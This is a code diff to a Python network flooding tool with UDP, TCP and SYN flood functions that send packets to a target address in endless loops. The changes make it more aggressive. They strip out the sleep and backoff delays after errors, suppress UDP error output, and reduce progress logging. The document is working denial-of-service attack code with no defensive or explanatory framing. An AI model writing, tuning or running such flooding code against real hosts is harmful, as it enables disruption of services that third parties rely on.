@@ -54,10 +54,8 @@ def get_socket_with_proxy():
 
 def udp_flood(target_ip, target_port, packet_size, thread_id, payload_mode):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 10 * 1024 * 1024 * 1024)
     payload = generate_payload(packet_size, payload_mode)
     sent = 0
-    delay = 0
     while True:
         try:
             sock.sendto(payload, (target_ip, target_port))
@@ -65,9 +63,7 @@ def udp_flood(target_ip, target_port, packet_size, thread_id, payload_mode):
             if sent % 100000 == 0:
                 print(f"{CYAN}[{timestamp()}][UDP-{thread_id}] Packets: {sent}{RESET}")
         except Exception as e:
-            print(f"{RED}[UDP-{thread_id}] Error: {e}{RESET}")
-            time.sleep(delay)
-            delay = min(0.1, delay + 0.001)
+            pass
 
 
 def tcp_flood(target_ip, target_port, packet_size, thread_id, payload_mode):
@@ -82,14 +78,13 @@ def tcp_flood(target_ip, target_port, packet_size, thread_id, payload_mode):
             for _ in range(10):
                 sock.send(payload)
                 sent += 1
-                if sent % 1000 == 0:
+                if sent % 10000 == 0:
                     print(
                         f"{YELLOW}[{timestamp()}][TCP-{thread_id}] Packets: {sent}{RESET}"
                     )
             sock.close()
         except Exception as e:
             print(f"{RED}[TCP-{thread_id}] Error: {e}{RESET}")
-            time.sleep(0.05)
 
 
 def syn_flood(target_ip, target_port, thread_id):
@@ -104,14 +99,13 @@ def syn_flood(target_ip, target_port, thread_id):
             packet = b"\x00" * 60
             sock.sendto(packet, (target_ip, target_port))
             sent += 1
-            if sent % 100 == 0:
+            if sent % 10000 == 0:
                 print(f"{GREEN}[{timestamp()}][SYN-{thread_id}] Packets: {sent}{RESET}")
         except PermissionError:
             print(f"{RED}[SYN-{thread_id}] Root required!{RESET}")
             return
         except Exception as e:
             print(f"{RED}[SYN-{thread_id}] Error: {e}{RESET}")
-            time.sleep(0.1)
 
 
 def check_latency(ip, port):
